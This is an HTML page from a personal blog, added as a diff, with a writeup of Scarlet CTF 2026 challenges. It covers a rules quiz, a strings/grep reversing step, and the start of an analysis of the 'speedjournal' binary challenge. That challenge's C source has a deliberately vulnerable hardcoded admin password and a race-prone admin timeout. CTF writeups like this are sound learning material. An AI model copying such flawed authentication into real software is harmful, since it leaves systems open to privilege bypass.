@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Challenges Writeup for Scarlet CTF 2026 | Crong&#39;s Blog</title>
+<meta property="og:title" content="Challenges Writeup for Scarlet CTF 2026 | Crong&#39;s Blog" />
+<meta name="twitter:title" content="Challenges Writeup for Scarlet CTF 2026 | Crong&#39;s Blog" />
+<meta itemprop="name" content="Challenges Writeup for Scarlet CTF 2026 | Crong&#39;s Blog" />
+<meta name="application-name" content="Challenges Writeup for Scarlet CTF 2026 | Crong&#39;s Blog" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="Datsuraku&#39;s blog">
+<meta itemprop="description" content="Datsuraku&#39;s blog" />
+<meta property="og:description" content="Datsuraku&#39;s blog" />
+<meta name="twitter:description" content="Datsuraku&#39;s blog" />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+  <link rel="alternate" hreflang="en" href="http://localhost:1313/timeline/scarlet-ctf-2026/" title="" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.153.2">
+
+    
+    <meta property="og:url" content="http://localhost:1313/timeline/scarlet-ctf-2026/">
+  <meta property="og:site_name" content="Crong&#39;s Blog">
+  <meta property="og:title" content="Challenges Writeup for Scarlet CTF 2026">
+  <meta property="og:description" content="Introduction Hello,
+This is my writeup for the challenges that I was able to solve(except for 1 :P)
+I was only able to solve 4 of them lmao, 100% skill issue T_T
+You can check the official writeups at https://github.com/scarlet-ctf/writeups/blob/main/2026/BINEX/speedjournal/exploit.py.
+Also, just to add, the screenshots used for this writeup was only taken today, because I forgot to take them before (dumb me). Thankfully, the challenges still seems to be up, but you can’t submit a flag now…and here I thought I could cheat and solve all of them (this is a joke btw lol)">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="timeline">
+    <meta property="article:published_time" content="2026-01-14T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-01-14T00:00:00+00:00">
+    <meta property="article:tag" content="Codereview">
+    <meta property="article:tag" content="Racecondition">
+    <meta property="article:tag" content="Web">
+
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Challenges Writeup for Scarlet CTF 2026">
+  <meta name="twitter:description" content="Introduction Hello,
+This is my writeup for the challenges that I was able to solve(except for 1 :P)
+I was only able to solve 4 of them lmao, 100% skill issue T_T
+You can check the official writeups at https://github.com/scarlet-ctf/writeups/blob/main/2026/BINEX/speedjournal/exploit.py.
+Also, just to add, the screenshots used for this writeup was only taken today, because I forgot to take them before (dumb me). Thankfully, the challenges still seems to be up, but you can’t submit a flag now…and here I thought I could cheat and solve all of them (this is a joke btw lol)">
+
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/timeline/scarlet-ctf-2026/">
+    <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+    <meta name="color-scheme" content="light dark">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+</head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:1313/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/categories/">
+                        Categories
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/tags/">
+                        Tags
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/timeline/">
+                        Timeline
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/crong/">
+                        Me???
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Challenges Writeup for Scarlet CTF 2026</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2026-01-14T00:00:00&#43;00:00" itemprop="datePublished"> Jan 14, 2026 </time>
+                </div>
+                
+            </header>
+            
+    
+    <details class="toc" ZgotmplZ>
+        <summary><b>Table of Contents</b></summary>
+        <nav id="TableOfContents"></nav>
+    </details>
+            <div class="page-content">
+                <h1 id="introduction">Introduction</h1>
+<p>Hello,</p>
+<p>This is my writeup for the challenges that I was able to solve(except for 1 :P)</p>
+<p>I was only able to solve 4 of them lmao, 100% skill issue T_T</p>
+<p><img src="/images/0.png" alt="Image Description"></p>
+<p>You can check the official writeups at <a href="https://github.com/scarlet-ctf/writeups/blob/main/2026/BINEX/speedjournal/exploit.py">https://github.com/scarlet-ctf/writeups/blob/main/2026/BINEX/speedjournal/exploit.py</a>.</p>
+<p>Also, just to add, the screenshots used for this writeup was only taken today, because I forgot to take them before (dumb me). Thankfully, the challenges still seems to be up, but you can&rsquo;t submit a flag now&hellip;and here I thought I could cheat and solve all of them (this is a joke btw lol)</p>
+<h1 id="readmerule-follower">README/Rule Follower</h1>
+<p>I easily solved this challenge by reading the rules lol.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>== (1/10) You are NOT allowed to compromise/pentest our CTF platform (rCTF, scoreboard, etc.) ==
+</span></span><span style="display:flex;"><span>T for TRUE, F for FALSE&gt; T
+</span></span><span style="display:flex;"><span>== (2/10) Flag sharing (sharing flags to someone not on your team) is NOT allowed ==
+</span></span><span style="display:flex;"><span>T for TRUE, F for FALSE&gt; T
+</span></span><span style="display:flex;"><span>== (3/10) If you have a question regarding the CTF, you ping the admins or DM them ==
+</span></span><span style="display:flex;"><span>T for TRUE, F for FALSE&gt; F
+</span></span><span style="display:flex;"><span>== (4/10) Asking for help from other people (not on your team) for challenges is allowed if you&#39;re stuck ==
+</span></span><span style="display:flex;"><span>T for TRUE, F for FALSE&gt; F
+</span></span><span style="display:flex;"><span>== (5/10) You are allowed to use automated scanners/fuzzing/bruteforcing whenever you wish with NO restrictions ==
+</span></span><span style="display:flex;"><span>T for TRUE, F for FALSE&gt; F
+</span></span><span style="display:flex;"><span>== (6/10) Your teams can be of unlimited size ==
+</span></span><span style="display:flex;"><span>T for TRUE, F for FALSE&gt; T
+</span></span><span style="display:flex;"><span>== (7/10) You are allowed to do ACTIVE attacking during OSINT (i.e: contacting potential targets), not just passive, when you feel it is necessary ==
+</span></span><span style="display:flex;"><span>T for TRUE, F for FALSE&gt; F
+</span></span><span style="display:flex;"><span>== (8/10) PASSIVE OSINT techniques are allowed on general RUSEC infrastructure only when EXPLICITLY given specific permission to by a challenge ==
+</span></span><span style="display:flex;"><span>T for TRUE, F for FALSE&gt; T
+</span></span><span style="display:flex;"><span>== (9/10) ACTIVE techniques (i.e: pentesting) are allowed on general RUSEC infrastructure at any time ==
+</span></span><span style="display:flex;"><span>T for TRUE, F for FALSE&gt; F
+</span></span><span style="display:flex;"><span>== (10/10) Official writeups will be posted at the end of the competition ==
+</span></span><span style="display:flex;"><span>T for TRUE, F for FALSE&gt; T
+</span></span></code></pre></div><pre tabindex="0"><code>RUSEC{you_read_the_rules}
+</code></pre><h1 id="revfirst_steps">Rev/first_steps</h1>
+<p>I used <code>strings</code> and <code>grep</code> to easily get the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>strings first_steps | grep RUSEC
+</span></span></code></pre></div><p><img src="/images/rev_steps.png" alt="Image Description"></p>
+<h1 id="binexspeedjournal">Binex/speedjournal</h1>
+<p>Players got 2 files for this challenge: Program&rsquo;s Source in C and a Makefile(not required)</p>
+<details>
+  <summary>speedjournal.c</summary>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;pthread.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define MAX_LOGS 8
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define LOG_SIZE 128
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define WAIT_TIME 1000
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> content[LOG_SIZE];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> <span style="color:#66d9ef">restricted</span>;
+</span></span><span style="display:flex;"><span>} Log;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Log logs[MAX_LOGS];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> log_count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> is_admin <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">logout_thread</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>arg) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">usleep</span>(WAIT_TIME);
+</span></span><span style="display:flex;"><span>    is_admin <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">login_admin</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> pw[<span style="color:#ae81ff">32</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Admin password: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>(pw, <span style="color:#66d9ef">sizeof</span>(pw), stdin);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strncmp</span>(pw, <span style="color:#e6db74">&#34;supersecret</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">12</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        is_admin <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pthread_t</span> t;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pthread_create</span>(<span style="color:#f92672">&amp;</span>t, NULL, logout_thread, NULL);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pthread_detach</span>(t);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;[+] Admin logged in (temporarily)&#34;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;[-] Wrong password&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">write_log</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (log_count <span style="color:#f92672">&gt;=</span> MAX_LOGS) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Log full&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Restricted? (1/0): &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> r;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>r);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">getchar</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Content: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>(logs[log_count].content, LOG_SIZE, stdin);
+</span></span><span style="display:flex;"><span>    logs[log_count].<span style="color:#66d9ef">restricted</span> <span style="color:#f92672">=</span> r;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    log_count<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">read_log</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> idx;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Index: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>idx);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">getchar</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> idx <span style="color:#f92672">&gt;=</span> log_count) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Invalid index&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (logs[idx].<span style="color:#66d9ef">restricted</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>is_admin) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Access denied&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Log: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, logs[idx].content);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">menu</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">1. Login admin&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;2. Write log&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;3. Read log&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;4. Exit&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setbuf</span>(stdout, NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcpy</span>(logs[<span style="color:#ae81ff">0</span>].content, <span style="color:#e6db74">&#34;RUSEC{not_the_real_flag}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    logs[<span style="color:#ae81ff">0</span>].<span style="color:#66d9ef">restricted</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    log_count <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">menu</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> c;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>c);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">getchar</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">switch</span> (c) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">login_admin</span>(); <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">write_log</span>(); <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">read_log</span>(); <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;?&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div>
+</details>
+<p>I run the program and it seems that the program has multiple functionalities, to log in as an admin, write a log, read a log, and exit.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">strcpy</span>(logs[<span style="color:#ae81ff">0</span>].content, <span style="color:#e6db74">&#34;RUSEC{not_the_real_flag}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>logs[<span style="color:#ae81ff">0</span>].<span style="color:#66d9ef">restricted</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>log_count <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span></code></pre></div><p>I started reading the code, and it looks like I need to be able to somehow print <code>logs[0].content</code>.</p>
+<p>So, I checked out  &ldquo;<code>read_log</code>&rdquo; and indeed this is probably the way to read <code>log[0]</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">read_log</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> idx;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Index: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>idx);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">getchar</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> idx <span style="color:#f92672">&gt;=</span> log_count) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Invalid index&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (logs[idx].<span style="color:#66d9ef">restricted</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>is_admin) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Access denied&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Log: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, logs[idx].content);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>It checks if the input(<code>idx</code>) is greater than <code>0</code> or if it&rsquo;s less than or equal to the <code>log_count</code>, if it passes then it proceeds to the next <code>if</code> statement, which checks if the log I&rsquo;m trying to read is restricted and if I&rsquo;m an admin.</p>
+<p>Cool, so now I know that <code>log[0]</code> is restricted, and since I&rsquo;m not an admin(<code>is_admin=0</code>), I can&rsquo;t just simply enter <code>0</code> to read <code>log[0]</code> .</p>
+<p>So I checked the <code>login_admin</code> function.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">login_admin</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> pw[<span style="color:#ae81ff">32</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Admin password: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>(pw, <span style="color:#66d9ef">sizeof</span>(pw), stdin);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strncmp</span>(pw, <span style="color:#e6db74">&#34;supersecret</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">12</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        is_admin <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pthread_t</span> t;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pthread_create</span>(<span style="color:#f92672">&amp;</span>t, NULL, logout_thread, NULL);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pthread_detach</span>(t);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;[+] Admin logged in (temporarily)&#34;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;[-] Wrong password&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
